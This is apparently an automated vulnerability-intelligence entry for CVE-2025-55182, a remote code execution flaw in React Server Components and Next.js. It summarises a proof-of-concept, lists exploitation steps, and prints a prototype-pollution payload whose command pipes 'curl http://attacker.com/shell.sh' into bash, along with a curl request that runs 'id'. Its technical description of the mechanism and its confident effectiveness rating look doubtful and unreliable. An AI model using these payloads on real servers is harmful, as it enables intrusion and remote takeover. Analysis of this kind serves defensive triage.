## CVE-2025-55182 - React Server Components, Next.js Remote Code Execution (RCE)

**漏洞编号:** CVE-2025-55182

**漏洞类型:** Remote Code Execution (RCE)

**影响应用:** React Server Components, Next.js

**危害等级:** Critical

**CVSS评分:** Not provided

**影响版本:** 19.0.0, 19.1.0, 19.1.1, 19.2.0

**利用条件:** Unauthenticated, remote network access required

**POC 可用性:** 9/10

**POC 类型:** Complete exploit

**攻击复杂度:** Low

**投毒风险:** 5%

## 详情

The "React2Shell" vulnerability (CVE-2025-55182) is a critical Remote Code Execution (RCE) flaw primarily affecting applications built with React Server Components (RSC) and often integrated into frameworks like Next.js. This vulnerability, widely described as "nuclear-level," stems from an insecure deserialization process within the React Flight protocol. React Server Components render components on the server side and stream them to the client using a JSON-like "Flight" protocol. A critical flaw in this protocol's handling of serialized data allows unauthenticated attackers to exploit prototype pollution, leading to arbitrary code execution on the server. Specifically, the deserialization mechanism fails to properly validate object property access paths, such as `__proto__` or `constructor`. By crafting a special `multipart` form or JSON request that includes a malicious `__proto__` property, attackers can inject arbitrary system commands. When the server processes this malformed input, the injected command is executed in the server's context, granting the attacker full control over the affected system. This vulnerability's broad impact, low attack threshold, and severe consequences make it an extremely high-priority threat.

**POC Effectiveness Analysis:**
The provided Proof-of-Concept (POC) code, consisting of `exploit.py` and `exploit.sh`, is highly effective and clearly demonstrates the RCE vulnerability. The `exploit.py` script leverages the `requests` library to send a POST request to a target `/api/flight` endpoint. Its core functionality resides in the crafted JSON payload: `{"__proto__": {"shell": "node -e \"require('child_process').exec('curl http://attacker.com/shell.sh | bash')\""}, "flightData": "malicious"}`. This payload explicitly targets the `__proto__` property, a common vector for prototype pollution. By injecting a `shell` property under `__proto__` with a `node -e` command, the attacker forces the vulnerable server to execute a system command, specifically downloading and executing a shell script from an attacker-controlled server. The `exploit.sh` script offers an analogous `curl` command: `curl -X POST http://192.168.1.100:3000/api/flight -H "Content-Type: application/json" -d '{"__proto__":{"shell":"id"}}'`. This version directly executes the `id` command, unequivocally proving RCE by retrieving user information. Both scripts are concise, directly implement the exploit logic, and require minimal setup, confirming their high quality as functional exploits for security research and validation. The `README.md` further enhances the POC's usability by detailing affected software versions and the vulnerability type.

**Exploitation Steps:**
1.  **Identify Target:** Locate a web application using React Server Components, commonly found in Next.js applications, that exposes an endpoint for React Flight protocol data (e.g., `/api/flight`).
2.  **Craft Payload:** Construct a malicious JSON payload. The key is the `__proto__` property, used for prototype pollution. Example: `{"__proto__": {"shell": "your_system_command"}, "additionalData": "..."}`. The `your_system_command` can be `id`, `whoami`, or a command to establish a reverse shell or download/execute a remote script.
3.  **Send Request:** Transmit the crafted payload via an HTTP POST request to the vulnerable endpoint (e.g., `http://target.com/api/flight`), ensuring the `Content-Type` header is set appropriately (e.g., `application/json`).
4.  **Execute Command:** The vulnerable server's deserialization process will interpret the manipulated `__proto__` property. This prototype pollution will cause the injected `shell` property (or similar) to be invoked, leading to the execution of the attacker's specified command within the server's operating system context.

**Poisoning Risk Analysis:**
The poisoning risk associated with the provided POC code (CVE-2025-55182) itself is assessed as very low, estimated at 5%. This evaluation is based on a thorough review of the `exploit.py` and `exploit.sh` files, as well as the accompanying `README.md`.

*   **Code Clarity and Readability:** The Python and Bash scripts are exceptionally clear, concise, and easy to understand. They do not employ any obfuscation techniques, making their functionality transparent to anyone with basic programming knowledge. The `README.md` provides explicit details regarding the affected software, vulnerability type, and context for the exploits. This transparency significantly reduces the risk of hidden malicious functionality.
*   **External Dependencies:** The `exploit.py` script relies on the standard `requests` library for Python, a widely used and trusted HTTP client, and the built-in `json` module for payload serialization. The `exploit.sh` script utilizes `curl`, a ubiquitous command-line tool for data transfer, and `bash` for script execution. None of these dependencies introduce inherent poisoning risks; they are standard and well-vetted components commonly used in development and security testing. The POC does not introduce or rely on obscure or untrusted third-party libraries that could harbor malicious code.
*   **Absence of Malicious Intent in POC Code:** A critical distinction must be made between the actions of the POC script itself and the *payload* it delivers to the target. The primary purpose of these POC scripts is to demonstrate the CVE-2025-55182 vulnerability by triggering Remote Code Execution on a *target* system. The "malicious" commands (e.g., `curl http://attacker.com/shell.sh | bash` or `id`) are *payloads* specifically designed to be executed *on the vulnerable server*, not *by the POC script itself* on the machine where the POC is being run. The POC scripts themselves do not contain any code that would:
    *   Install backdoors or persist on the user's machine executing the POC.
    *   Exfiltrate sensitive data from the user's local system.
    *   Modify system files or configurations on the user's machine without explicit, visible commands.
    *   Initiate unsolicited network connections from the user's machine to suspicious external command-and-control (C2) servers (beyond the `attacker.com` specified within the *payload* for the *target*).
*   **Ethical Use and Mitigation:** While the POC is a powerful tool for demonstrating RCE and could theoretically be misused by malicious actors against legitimate targets, this risk pertains to the *application* of the POC, not to the POC code being inherently poisoned. For defensive security teams, this POC serves as an invaluable, clean tool for validating patch effectiveness, testing intrusion detection systems, and understanding the attack surface.
*   **Conclusion:** Based on the analysis of its code structure, dependencies, and intended functionality, there is no evidence of malicious intent or hidden features within the provided POC code that would compromise the user's machine executing it. The very low poisoning risk allows organizations to safely analyze and adapt this POC for legitimate defensive testing and vulnerability validation purposes.

**项目地址:** Not available

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-55182
